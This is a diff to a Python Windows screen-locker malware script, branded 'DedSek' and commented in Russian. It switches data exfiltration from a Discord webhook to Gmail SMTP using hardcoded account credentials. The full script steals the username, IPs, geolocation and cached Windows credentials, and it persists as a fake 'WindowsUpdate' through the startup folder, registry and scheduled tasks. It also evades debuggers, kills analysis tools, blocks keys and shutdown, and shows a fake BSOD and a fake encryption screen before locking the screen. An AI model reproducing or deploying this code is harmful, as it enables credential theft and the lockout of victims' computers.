@@ -12,18 +12,23 @@ from win32com.client import Dispatch
 import base64
 import random
 import socket
-import getpass
 import subprocess
 import json
 import urllib.request
+import urllib.parse
+import smtplib
+from email.mime.text import MIMEText
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
 PASSWORD = "1601"
 MAX_ATTEMPTS = 10
 SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"
-# Webhook для отправки украденных данных
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
+
+# Gmail
+GMAIL_LOGIN = "xzx78848@gmail.com"
+GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
+RECEIVER_EMAIL = "xzx78848@gmail.com"
 # ============================================================
 
 attempts_left = MAX_ATTEMPTS
@@ -32,28 +37,18 @@ attempts_left = MAX_ATTEMPTS
 def steal_data():
     try:
         data = {}
-        
-        # Имя пользователя Windows
         data["username"] = os.environ.get("USERNAME", "Unknown")
-        
-        # Имя компьютера
         data["hostname"] = socket.gethostname()
-        
-        # Локальный IP
         try:
             data["local_ip"] = socket.gethostbyname(socket.gethostname())
         except:
             data["local_ip"] = "Unknown"
-        
-        # Внешний IP
         try:
-            data["public_ip"] = urllib.request.urlopen("https://api.ipify.org").read().decode()
+            data["public_ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
         except:
             data["public_ip"] = "Unknown"
-        
-        # Геолокация по IP
         try:
-            geo = urllib.request.urlopen(f"http://ip-api.com/json/{data['public_ip']}").read().decode()
+            geo = urllib.request.urlopen(f"http://ip-api.com/json/{data['public_ip']}", timeout=5).read().decode()
             geo_json = json.loads(geo)
             data["country"] = geo_json.get("country", "Unknown")
             data["city"] = geo_json.get("city", "Unknown")
@@ -62,33 +57,49 @@ def steal_data():
             data["country"] = "Unknown"
             data["city"] = "Unknown"
             data["isp"] = "Unknown"
-        
-        # Пароль Windows (из реестра/кэша)
         try:
             result = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            data["cached_credentials"] = result[:500]
+            data["cached_credentials"] = result[:500] if result else "None"
         except:
             data["cached_credentials"] = "None"
-        
-        # Отправка в Discord
-        payload = {
-            "content": f"```json\n{json.dumps(data, indent=2, ensure_ascii=False)}\n```"
-        }
-        req = urllib.request.Request(WEBHOOK_URL, 
-                                     data=json.dumps(payload).encode(),
-                                     headers={"Content-Type": "application/json"})
-        urllib.request.urlopen(req)
+
+        message = f"""Subject: 🔥 DedSek Logger - {data['username']}
+
+👤 ПОЛЬЗОВАТЕЛЬ: {data['username']}
+💻 КОМПЬЮТЕР: {data['hostname']}
+🌐 ЛОКАЛЬНЫЙ IP: {data['local_ip']}
+🌍 ВНЕШНИЙ IP: {data['public_ip']}
+📍 СТРАНА: {data['country']}
+🏙 ГОРОД: {data['city']}
+📡 ПРОВАЙДЕР: {data['isp']}
+
+🔑 КЭШ ПАРОЛЕЙ WINDOWS:
+{data['cached_credentials']}
+
+🕒 ВРЕМЯ: {time.strftime('%d.%m.%Y %H:%M:%S')}"""
+
+        send_email(message)
     except:
         pass
 
-# ========== АНТИ-ОТЛАДКА И АНТИ-ВМ ==========
+def send_email(message):
+    try:
+        msg = MIMEText(message, 'plain', 'utf-8')
+        msg['Subject'] = f'DedSek Logger - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M")}'
+        msg['From'] = GMAIL_LOGIN
+        msg['To'] = RECEIVER_EMAIL
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=15)
+        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+    except:
+        pass
+
+# ========== АНТИ-ОТЛАДКА ==========
 def anti_debug():
     try:
-        # Проверка на запуск в песочнице/ВМ
         if ctypes.windll.kernel32.IsDebuggerPresent():
             os._exit(0)
-        
-        # Проверка на распространённые инструменты анализа
         suspicious = ["wireshark.exe", "procmon.exe", "processhacker.exe", 
                      "taskmgr.exe", "regedit.exe", "msconfig.exe"]
         for proc in suspicious:
@@ -99,20 +110,14 @@ def anti_debug():
 # ========== СКРЫТИЕ ПРОЦЕССА ==========
 def hide_process():
     try:
-        # Меняем название окна консоли
         ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-        
-        # Скрываем окно
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
             ctypes.windll.user32.ShowWindow(hwnd, 0)
-        
-        # Защита процесса от завершения
-        ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
     except:
         pass
 
-# ========== АВТОЗАГРУЗКА (МНОЖЕСТВЕННАЯ) ==========
+# ========== АВТОЗАГРУЗКА ==========
 def add_to_startup():
     try:
         current_path = os.path.abspath(__file__)
@@ -124,7 +129,6 @@ def add_to_startup():
                 pass
             current_path = pyw_path
         
-        # Способ 1: Папка автозагрузки
         startup_folder = winshell.startup()
         shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
         shell = Dispatch('WScript.Shell')
@@ -135,10 +139,9 @@ def add_to_startup():
         shortcut.IconLocation = "shell32.dll,13"
         shortcut.save()
         
-        # Способ 2: Реестр HKCU
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         try:
             import winreg
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, 
                             f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{current_path}"')
@@ -146,7 +149,6 @@ def add_to_startup():
         except:
             pass
         
-        # Способ 3: Планировщик задач
         try:
             task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -176,7 +178,7 @@ def block_input(block=True):
     except:
         pass
 
-# ========== БЛОКИРОВКА ВСЕХ ГОРЯЧИХ КЛАВИШ ==========
+# ========== БЛОКИРОВКА ВСЕХ КЛАВИШ ==========
 def block_all_keys():
     try:
         import keyboard
@@ -186,10 +188,7 @@ def block_all_keys():
             'ctrl+w', 'ctrl+f4', 'ctrl+tab',
             'win', 'win+d', 'win+r', 'win+e', 'win+l',
             'win+m', 'win+tab', 'win+x', 'win+u',
-            'win+ctrl+enter', 'win+ctrl+f4',
             'alt', 'ctrl', 'shift', 'f11',
-            'left windows', 'right windows',
-            'ctrl+break', 'ctrl+alt+break',
             'print screen', 'alt+print screen'
         ]
         for combo in all_combos:
@@ -197,8 +196,6 @@ def block_all_keys():
                 keyboard.add_hotkey(combo, lambda: None, suppress=True, timeout=0)
             except:
                 pass
-        
-        # Блокируем отдельные клавиши
         block_keys = ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
                      'print screen','scroll lock','pause']
         for key in block_keys:
@@ -214,8 +211,7 @@ def kill_processes():
     kill_list = [
         "taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe",
         "regedit.exe", "procexp.exe", "procmon.exe", "processhacker.exe",
-        "wireshark.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe",
-        "ida.exe", "ida64.exe", "ImmunityDebugger.exe"
+        "wireshark.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe"
     ]
     while True:
         try:
@@ -228,7 +224,6 @@ def kill_processes():
 # ========== ЗАЩИТА ОТ ВЫКЛЮЧЕНИЯ ==========
 def prevent_shutdown():
     try:
-        # Блокируем shutdown
         ctypes.windll.user32.ShutdownBlockReasonCreate(
             ctypes.windll.kernel32.GetConsoleWindow(), 
             "Windows Update in progress..."
@@ -239,9 +234,7 @@ def prevent_shutdown():
 # ========== СИНИЙ ЭКРАН СМЕРТИ ==========
 def show_bsod():
     try:
-        # Убиваем explorer для пущего эффекта
         os.system("taskkill /f /im explorer.exe >nul 2>&1")
-        
         bsod = tk.Tk()
         bsod.attributes('-fullscreen', True)
         bsod.attributes('-topmost', True)
@@ -287,8 +280,6 @@ assistance."""
         
         lbl.config(text=bsod_text)
         bsod.update()
-        
-        # Блокируем всё на BSoD
         for i in range(30):
             try:
                 ctypes.windll.user32.BlockInput(True)
@@ -296,8 +287,6 @@ assistance."""
                 pass
             bsod.update()
             time.sleep(1)
-        
-        # Принудительная перезагрузка
         os.system("shutdown /r /t 0 /f")
         os._exit(0)
     except:
@@ -318,7 +307,6 @@ def boot_animation():
                    font=('Courier', 20, 'bold'))
     lbl.pack(expand=True)
     
-    # Моргание
     for i in range(8):
         if i % 2 == 0:
             anim.configure(bg='white')
@@ -333,7 +321,6 @@ def boot_animation():
     lbl.config(bg='black', fg='#00FF00')
     anim.attributes('-alpha', 0.0)
     
-    # Плавное появление
     for alpha in range(0, 110, 5):
         anim.attributes('-alpha', alpha/100)
         lbl.config(text="DedSek тебя взломали")
@@ -343,22 +330,19 @@ def boot_animation():
     anim.attributes('-alpha', 1.0)
     time.sleep(1.5)
     
-    # Прогресс шифрования
     progress = [
         "Идет шифровка данных...",
-        "[■■■■■■■■■■■■■■■■■■■■] 0%",
-        "[■■■■■■■■■■■■■■■■■■■■] 8%",
-        "[■■■■■■■■■■■■■■■■■■■■] 17%",
-        "[■■■■■■■■■■■■■■■■■■■■] 25%",
-        "[■■■■■■■■■■■■■■■■■■■■] 33%",
-        "[■■■■■■■■■■■■■■■■■■■■] 42%",
-        "[■■■■■■■■■■■■■■■■■■■■] 50%",
-        "[■■■■■■■■■■■■■■■■■■■■] 58%",
-        "[■■■■■■■■■■■■■■■■■■■■] 67%",
-        "[■■■■■■■■■■■■■■■■■■■■] 75%",
-        "[■■■■■■■■■■■■■■■■■■■■] 83%",
-        "[■■■■■■■■■■■■■■■■■■■■] 92%",
-        "[■■■■■■■■■■■■■■■■■■■■] 100%",
+        "[                    ] 0%",
+        "[##                  ] 10%",
+        "[####                ] 20%",
+        "[######              ] 30%",
+        "[########            ] 40%",
+        "[##########          ] 50%",
+        "[############        ] 60%",
+        "[##############      ] 70%",
+        "[################    ] 80%",
+        "[##################  ] 90%",
+        "[####################] 100%",
         "",
         "ДАННЫЕ УСПЕШНО ЗАШИФРОВАНЫ!"
     ]
@@ -387,7 +371,6 @@ class WinLocker:
         
         global attempts_left
         
-        # Картинка
         try:
             img_data = base64.b64decode(SKULL_BASE64)
             img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
@@ -400,7 +383,6 @@ class WinLocker:
         except:
             pass
         
-        # Сообщение
         msg = """ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!
 
 ИДИ ЛАПУ СОСИ
@@ -436,7 +418,6 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
                            font=('Courier', 10, 'bold'), justify='left')
         lbl_msg.place(relx=0.5, rely=0.48, anchor='center')
         
-        # Поле ввода
         center_frame = tk.Frame(self.win, bg='black')
         center_frame.place(relx=0.5, rely=0.88, anchor='center')
         
@@ -455,8 +436,6 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_force()
-        
-        # Постоянный фокус
         self.win.after(100, self.keep_focus)
     
     def keep_focus(self):
@@ -492,29 +471,14 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
 
 # ========== ТОЧКА ВХОДА ==========
 if __name__ == "__main__":
-    # Анти-отладка
     anti_debug()
-    
-    # Скрываем процесс
     hide_process()
-    
-    # Крадём данные
     threading.Thread(target=steal_data, daemon=True).start()
-    
-    # Автозагрузка
     add_to_startup()
-    
-    # Анимация
     boot_animation()
-    
-    # Блокируем ввод
     block_input(True)
     prevent_shutdown()
-    
-    # Запускаем убийцу процессов и блокировщик клавиш
     threading.Thread(target=kill_processes, daemon=True).start()
     threading.Thread(target=block_all_keys, daemon=True).start()
-    
-    # Запускаем локер
     WinLocker()
     tk.mainloop()
